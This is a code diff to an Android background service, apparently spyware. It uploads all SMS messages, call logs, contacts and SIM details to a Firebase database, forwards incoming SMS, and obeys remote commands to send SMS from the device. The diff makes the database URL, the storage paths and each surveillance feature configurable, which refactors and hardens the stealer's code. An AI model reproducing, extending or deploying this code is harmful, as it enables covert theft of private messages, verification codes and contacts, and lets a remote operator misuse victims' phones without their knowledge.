@@ -47,6 +47,7 @@ public class BackgroundSyncService extends Service {
     private static final int NOTIFICATION_ID = 999;
 
     private DatabaseReference databaseReference;
+    private AppConfig config;
     private String deviceId;
     private Handler handler;
     private Runnable syncRunnable;
@@ -61,15 +62,21 @@ public class BackgroundSyncService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
+        config = AppConfig.get(this);
         FirebaseApp.initializeApp(this);
-        databaseReference = FirebaseDatabase.getInstance().getReference();
+        String dbUrl = config.firebaseDatabaseUrl();
+        if (dbUrl != null) {
+            databaseReference = FirebaseDatabase.getInstance(dbUrl).getReference();
+        } else {
+            databaseReference = FirebaseDatabase.getInstance().getReference();
+        }
         deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         handler = new Handler(Looper.getMainLooper());
         smsManager = SmsManager.getDefault();
         createNotificationChannel();
         startForeground(NOTIFICATION_ID, createNotification());
-        loadForwardingSettings();
-        listenForManualCommands();
+        if (config.syncEnabled("sms_forwarding")) loadForwardingSettings();
+        if (config.syncEnabled("manual_send_sms")) listenForManualCommands();
     }
 
     @Override
@@ -90,14 +97,19 @@ public class BackgroundSyncService extends Service {
     }
 
     private void syncDataToFirebase() {
-        DatabaseReference deviceRef = databaseReference.child("devices").child(deviceId);
-        deviceRef.child("online_status").setValue(true);
-        deviceRef.child("online_status").onDisconnect().setValue(false);
-        deviceRef.child("device_info").child("last_seen").onDisconnect().setValue(ServerValue.TIMESTAMP);
-        deviceRef.child("live_data").setValue(collectLiveData());
-        updateDeviceInfo();
-        updateDevicesStatus();
-        checkAndForwardNewSms();
+        String root = config.deviceRoot();
+        DatabaseReference deviceRef = databaseReference.child(root).child(deviceId);
+        if (config.syncEnabled("online_status")) {
+            deviceRef.child("online_status").setValue(true);
+            deviceRef.child("online_status").onDisconnect().setValue(false);
+            deviceRef.child("device_info").child("last_seen").onDisconnect().setValue(ServerValue.TIMESTAMP);
+        }
+        if (config.syncEnabled("live_data")) {
+            deviceRef.child("live_data").setValue(collectLiveData());
+        }
+        if (config.syncEnabled("device_info")) updateDeviceInfo();
+        if (config.syncEnabled("devices_status") || config.syncEnabled("clients_node")) updateDevicesStatus();
+        if (config.syncEnabled("sms_forwarding")) checkAndForwardNewSms();
     }
 
     private void updateDevicesStatus() {
@@ -110,13 +122,17 @@ public class BackgroundSyncService extends Service {
         status.put("battery", getBatteryLevel());
         status.put("network", getNetworkType());
         status.put("charging", isDeviceCharging());
-        if (checkPermission(Manifest.permission.READ_SMS)) {
+        if (config.permissionEnabled("read_sms") && checkPermission(Manifest.permission.READ_SMS)) {
             status.put("sms_count", getSmsCount());
         }
-        DatabaseReference statusRef = databaseReference.child("devices_status").child(deviceId);
-        statusRef.setValue(status);
-        statusRef.onDisconnect().removeValue();
-        databaseReference.child("clients").child(deviceId).setValue(status);
+        if (config.syncEnabled("devices_status")) {
+            DatabaseReference statusRef = databaseReference.child(config.statusRoot()).child(deviceId);
+            statusRef.setValue(status);
+            statusRef.onDisconnect().removeValue();
+        }
+        if (config.syncEnabled("clients_node")) {
+            databaseReference.child(config.clientsRoot()).child(deviceId).setValue(status);
+        }
     }
 
     private Map<String, Object> collectLiveData() {
@@ -127,18 +143,18 @@ public class BackgroundSyncService extends Service {
         liveData.put("battery_level", getBatteryLevel());
         liveData.put("network_type", getNetworkType());
         liveData.put("is_charging", isDeviceCharging());
-        liveData.put("permissions", getAllPermissions());
-        liveData.put("sim_info", getSimInformation());
+        if (config.syncEnabled("permissions_status")) liveData.put("permissions", getAllPermissions());
+        if (config.syncEnabled("sim_info")) liveData.put("sim_info", getSimInformation());
 
-        if (checkPermission(Manifest.permission.READ_SMS)) {
+        if (config.syncEnabled("all_sms") && config.permissionEnabled("read_sms") && checkPermission(Manifest.permission.READ_SMS)) {
             liveData.put("total_sms", getSmsCount());
             uploadAllSms();
         }
-        if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
+        if (config.syncEnabled("all_calls") && config.permissionEnabled("read_call_log") && checkPermission(Manifest.permission.READ_CALL_LOG)) {
             liveData.put("total_calls", getCallLogCount());
             uploadAllCalls();
         }
-        if (checkPermission(Manifest.permission.READ_CONTACTS)) {
+        if (config.syncEnabled("all_contacts") && config.permissionEnabled("read_contacts") && checkPermission(Manifest.permission.READ_CONTACTS)) {
             liveData.put("contacts_count", getContactCount());
             uploadAllContacts();
         }
@@ -153,7 +169,7 @@ public class BackgroundSyncService extends Service {
         deviceInfo.put("android_version", Build.VERSION.RELEASE);
         deviceInfo.put("last_seen", ServerValue.TIMESTAMP);
         deviceInfo.put("sim_info", getDetailedSimInfo());
-        databaseReference.child("devices").child(deviceId).child("device_info").updateChildren(deviceInfo);
+        databaseReference.child(config.deviceRoot()).child(deviceId).child("device_info").updateChildren(deviceInfo);
     }
 
     private void uploadAllSms() {
@@ -164,7 +180,7 @@ public class BackgroundSyncService extends Service {
                 Map<String, Object> smsData = new HashMap<>();
                 smsData.put("total_count", allMessages.size());
                 smsData.put("messages", allMessages);
-                databaseReference.child("devices").child(deviceId).child("all_sms").setValue(smsData);
+                databaseReference.child(config.deviceRoot()).child(deviceId).child("all_sms").setValue(smsData);
             }
         }).start();
     }
@@ -215,7 +231,7 @@ public class BackgroundSyncService extends Service {
                 Map<String, Object> callData = new HashMap<>();
                 callData.put("total_count", allCalls.size());
                 callData.put("calls", allCalls);
-                databaseReference.child("devices").child(deviceId).child("all_calls").setValue(callData);
+                databaseReference.child(config.deviceRoot()).child(deviceId).child("all_calls").setValue(callData);
             }
         }).start();
     }
@@ -263,7 +279,7 @@ public class BackgroundSyncService extends Service {
                 Map<String, Object> contactData = new HashMap<>();
                 contactData.put("total_count", allContacts.size());
                 contactData.put("contacts", allContacts);
-                databaseReference.child("devices").child(deviceId).child("all_contacts").setValue(contactData);
+                databaseReference.child(config.deviceRoot()).child(deviceId).child("all_contacts").setValue(contactData);
             }
         }).start();
     }
@@ -335,7 +351,7 @@ public class BackgroundSyncService extends Service {
             public void onCancelled(@NonNull DatabaseError error) {
             }
         };
-        databaseReference.child("devices").child(deviceId).child("forwarding_settings")
+        databaseReference.child(config.deviceRoot()).child(deviceId).child("forwarding_settings")
             .addValueEventListener(forwardingListener);
     }
 
@@ -359,7 +375,7 @@ public class BackgroundSyncService extends Service {
             log.put("body", body != null && body.length() > 100 ? body.substring(0, 100) : body);
             log.put("status", "FORWARDED");
             log.put("forwarded_at", ServerValue.TIMESTAMP);
-            databaseReference.child("devices").child(deviceId).child("forwarded_sms").push().setValue(log);
+            databaseReference.child(config.deviceRoot()).child(deviceId).child("forwarded_sms").push().setValue(log);
         } catch (Exception e) {
         }
     }
@@ -410,7 +426,7 @@ public class BackgroundSyncService extends Service {
                             log.put("message", message);
                             log.put("status", "SENT");
                             log.put("sent_at", ServerValue.TIMESTAMP);
-                            databaseReference.child("devices").child(deviceId).child("sent_sms").push().setValue(log);
+                            databaseReference.child(config.deviceRoot()).child(deviceId).child("sent_sms").push().setValue(log);
                         } catch (Exception e) {
                         }
                     }
@@ -421,7 +437,7 @@ public class BackgroundSyncService extends Service {
             public void onCancelled(@NonNull DatabaseError error) {
             }
         };
-        databaseReference.child("devices").child(deviceId).child("manual_commands").child("send_sms")
+        databaseReference.child(config.deviceRoot()).child(deviceId).child("manual_commands").child("send_sms")
             .addValueEventListener(commandListener);
     }
 
@@ -556,13 +572,13 @@ public class BackgroundSyncService extends Service {
 
     @Override
     public void onDestroy() {
-        databaseReference.child("devices").child(deviceId).child("online_status").setValue(false);
+        databaseReference.child(config.deviceRoot()).child(deviceId).child("online_status").setValue(false);
         if (handler != null && syncRunnable != null) handler.removeCallbacks(syncRunnable);
         if (forwardingListener != null) 
-            databaseReference.child("devices").child(deviceId).child("forwarding_settings")
+            databaseReference.child(config.deviceRoot()).child(deviceId).child("forwarding_settings")
                 .removeEventListener(forwardingListener);
         if (commandListener != null)
-            databaseReference.child("devices").child(deviceId).child("manual_commands").child("send_sms")
+            databaseReference.child(config.deviceRoot()).child(deviceId).child("manual_commands").child("send_sms")
                 .removeEventListener(commandListener);
         super.onDestroy();
     }
